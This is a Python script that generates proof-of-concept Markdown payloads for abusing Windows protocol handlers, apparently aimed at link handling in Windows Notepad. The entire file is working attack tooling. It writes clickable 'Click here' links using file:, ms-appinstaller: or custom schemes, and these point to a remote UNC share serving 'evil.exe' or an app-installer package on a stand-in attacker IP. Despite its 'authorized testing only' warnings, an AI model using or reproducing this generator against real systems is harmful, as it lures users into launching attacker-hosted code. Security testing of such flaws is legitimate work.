#!/usr/bin/env python3
"""Generate PoC Markdown payloads for Windows Protocol Handler abuse testing.

Usage:
    python generate-poc.py --scheme file --target \\192.0.2.10\\share\\evil.exe --output test.md
    python generate-poc.py --scheme ms-appinstaller --target \\192.0.2.10\\share\\pkg.appinstaller --output test.md
"""

import argparse
import sys
from pathlib import Path


def generate_payload(scheme: str, target: str, link_text: str = "Click here") -> str:
    """Generate a Markdown payload with the specified scheme and target."""
    
    # Normalize backslashes for UNC paths
    normalized_target = target.replace("\\\\", "\\\\")
    
    # Generate both standard and autolink syntaxes
    standard_link = f"[{link_text}]({scheme}://{normalized_target})"
    autolink = f"<{scheme}://{normalized_target}>"
    
    # Create a complete Markdown file
    payload = f"""# Test Payload

## Standard Link Syntax
{standard_link}

## Autolink Syntax
{autolink}

## Notes
- This payload is for authorized testing only
- Requires user to open in Windows Notepad
- Requires user to click the link
- Target: {scheme}://{normalized_target}
"""
    
    return payload


def main():
    parser = argparse.ArgumentParser(
        description="Generate PoC Markdown payloads for Windows Protocol Handler abuse testing"
    )
    parser.add_argument(
        "--scheme",
        required=True,
        choices=["file", "ms-appinstaller", "custom"],
        help="URI scheme to use (file, ms-appinstaller, or custom)"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target path/URL (e.g., \\\\192.0.2.10\\\\share\\\\evil.exe)"
    )
    parser.add_argument(
        "--link-text",
        default="Click here",
        help="Text to display for the link (default: 'Click here')"
    )
    parser.add_argument(
        "--output",
        required=True,
        help="Output file path (must end with .md)"
    )
    parser.add_argument(
        "--custom-scheme",
        default="",
        help="Custom scheme name (only used if --scheme is 'custom')"
    )
    
    args = parser.parse_args()
    
    # Validate output file
    output_path = Path(args.output)
    if output_path.suffix.lower() != ".md":
        print("Error: Output file must have .md extension")
        sys.exit(1)
    
    # Determine scheme to use
    if args.scheme == "custom" and not args.custom_scheme:
        print("Error: --custom-scheme required when --scheme is 'custom'")
        sys.exit(1)
    
    scheme = args.custom_scheme if args.scheme == "custom" else args.scheme
    
    # Generate and write payload
    payload = generate_payload(scheme, args.target, args.link_text)
    
    output_path.write_text(payload)
    print(f"PoC payload written to: {output_path}")
    print(f"\nGenerated payload:")
    print("-" * 40)
    print(payload)
    print("-" * 40)
    print("\n⚠️  WARNING: This payload is for authorized testing only.")
    print("   - Requires user to open in Windows Notepad")
    print("   - Requires user to click the link")
    print("   - Ensure you have proper authorization before testing")


if __name__ == "__main__":
    main()
